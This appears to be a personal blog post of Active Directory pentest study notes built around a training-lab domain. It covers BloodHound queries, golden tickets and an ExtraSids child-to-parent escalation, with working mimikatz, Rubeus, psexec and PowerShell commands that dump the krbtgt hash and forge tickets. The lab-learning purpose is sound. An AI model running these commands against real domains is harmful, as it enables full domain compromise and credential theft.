---
title: Active Directory notes
author: Zhibeau
date: 2024-01-15 00:51:00 -0400
img_path: https:////raw.githubusercontent.com/Zhibeau/zhibeau.github.io/main/_posts/24_01_15/
categories: [Notes]
tags: [Cybersecurity, Pentest, Active Directory]
---

## Privilege Access
Without local admin rights, how to move laterally?

1. RDP
2. WinRM
3. SQL

Typically the first thing I check after importing BloodHound data is:
Does the Domain Users group have local admin rights or execution rights (such as RDP or WinRM) over one or more hosts?

Custom cypher query
Search for WinRM Users
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

## Kerberos Double-Hop

![Understanding Kerberos Double Hop](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/understanding-kerberos-double-hop/ba-p/395463)

![Double Hop](KerberosDoubleHop.png)

## KRBTGT (KerberosTicket Granting Ticket) account

- Function: To encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets.

- **Golden Ticket**: The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain.

## ExtraSids Attack
**child --> parent domain compromise**
Add the SID in the sidHistory attribute of a user, then the user can access the domain with this domain.
![sidHistory](sid-history.png)

### Steps (With an example)

- The KRBTGT hash for the child domain (dcsync attack with a domain admin account)
- The FQDN of the child domain.
```mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt```
**9d765b482771505cbe97411065964d5f**
**LOGISTICS.INLANEFREIGHT.LOCAL**
- The SID for the child domain (can be seen with the previous command) or:
```PS C:\htb> Get-DomainSID```
**S-1-5-21-2806153819-209893948-922872689**
- The name of a target user in the child domain (does not need to exist! We can fake one)
**hacker**
- The SID of the Enterprise Admins group of the root domain.
```PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid```
**S-1-5-21-3842939050-3880317879-2865463114-519**

## Golden ticket creation
```mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt```
```.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt```

## Admin Password Re-Use
For example, there is a bidirectional trust between Domain A and B. Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.

## Login to a DC
```psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238```
```Enter-PSSession -ComputerName MS01 -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "inlanefreight.local\svc_sql", (ConvertTo-SecureString "lucky7" -AsPlainText -Force))```